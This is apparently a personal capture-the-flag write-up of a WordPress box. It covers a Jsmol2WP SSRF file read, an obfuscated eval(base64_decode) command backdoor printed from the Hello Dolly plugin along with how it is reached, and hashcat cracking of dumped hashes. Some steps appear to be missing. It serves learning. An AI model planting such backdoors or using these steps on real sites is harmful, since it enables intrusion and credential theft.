This was a pretty fun box. Even though I needed some hints, and still took a long time to finish the box, I feel that I learned a ton.

The CTF starts by enumerating a Wordpress instance, finding an SSRF vulnerability that leads to an unauthenticated local file-read. Using this, we find some credentials for web-access. Once we're logged into the web-app, we find that a custom plugin is installed, which contains a backdoor for a web-shell, which we use to catch a reverse shell as the first local user in a long chain of local user-accounts through which we pivot using standard tricks, such as access misconfigurations, exposed SSH-keys, and old backup-files.

The `e -ap` flag simply enumerates all plugins. The scan showed me two potential vulnerabilities in the `Jsmol2WP` plugin (which is used by chemists to convert chemical formulas into pictures/diagrams, as far as I understand):

1. Unauthenticated Cross-Site Scripting
2. Unauthenticated Server Side Request Forgery (SSRF)

The second vulnerability sounded easier to verify (with RCE in mind), so I left the XSS for later, in case the SSRF would turn out to be a dead-end.

Turns out the SSRF exploit (CVE-2018-20463) is very straightforward. One only has to send an unauthenticated forged GET request to `jsmol.php` to get local file-read, as I found in [this advisory](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt). The whole plugin runs in a file called `hello.php` (see [here](https://github.com/WordPress/hello-dolly)), so I modified the SSRF payload to `../../hello.php`, since we only want to go up two directories into `/wp-content/plugins`:

Indeed, there seems to be a backdoor here, namely the string

```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='))
```

which decodes to:

```php
if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```

where both `\143\155\x64` and `\143\x6d\144` evaluate to `cmd`, since these obfuscated strings are just mixes of octal (\NNN) and hex (\xNN) escapes.

> **Note**: I learned from Ippsec that there's a reason one includes the `if (isset($_GET[...]))` in a backdoor like this. If we were to leave this out, a GET request to this endpoint would only work if the parameter is provided as well, and otherwise it will throw an error or crash, which would not be very stealthy obviously. I.e. a call to `hello.php?cmd=whoami` would answer with 200 OK, whereas a call to `hello.php` would error out.

However, now I struggled a bit to find out how to call this backdoor. I guessed that I should send a request like the following, which did not work:

```http
GET /wp-content/plugins/hello.php?cmd=id HTTP/1.1
```

After some time I realized that the Hello Dolly plugin is called when `index.php` is loaded (since these quotes are displayed on the dashboard), so I tried this endpoint:

2. Enter the password from earlier
3. Run `show databases;`
4. Run `USE wordpress;`
5. Run `SHOW tables;`

Looking around the file system more, I also found a DB-backup at `/opt/wp_backup.sql`, which contained hashes that were different than the ones from the productive DB. Naturally, I tried cracking all hashes (old and new) using `hashcat`. First, I wrote all credentials to a file `hashes.txt` in the format `username:hash` using the following command:

```console
hashcat -a0 -m400 --username hashes.txt /usr/share/wordlists/rockyou.txt
```

The flag `-a0` tells `hashcat` to use a dictionary, `--username` tells `hashcat` that we also supply usernames in `hashes.txt`, and `-m400` is the hash-type for phpass, which is the format of the dumped hashes.

However, after about ~10 minutes it returned nothing and I cancelled the process, at which point I was stuck. I loaded LinPEAS onto the box and ran it, but found nothing useful apart from kernel exploits, which would likely defeat the challenges' purpose.

## Lessons Learned

1. If the target is Wordpress, always launch a `WPScan` scan (with API-key!) in the background for enumeration---it **never** hurts.
2. Even if you find a clear backdoor in the source code, it may not be easy finding the access point (i.e. finding `/wp-admin/index.php?cmd=id`)
3. If you find a DB, **always** try to dump it and crack hashes etc.
4. Give the process of cracking hashes more time (or try `john` instead of `hashcat`). Otherwise you may miss things.
5. Sometimes, `linpeas.sh` is useless. I ran LinPEAS twice in this CTF, and in both instances it turned out to be totally unnecessary.
6. For local PrivEsc and pivoting, always try the easy things first: `sudo -l`, `su USER`, find `.ssh` directories, check `env`, look for files that are out-of-place, ...
7. `zip2john` is a very useful tool (in fact, any `___2john` binary is useful, and I should always think of using this tool if I need to crack some password)
8. It's very easy to fall down a rabbit-hole, i.e. first trying to exploit `xmlrpc.php`, just because it came up on scans.
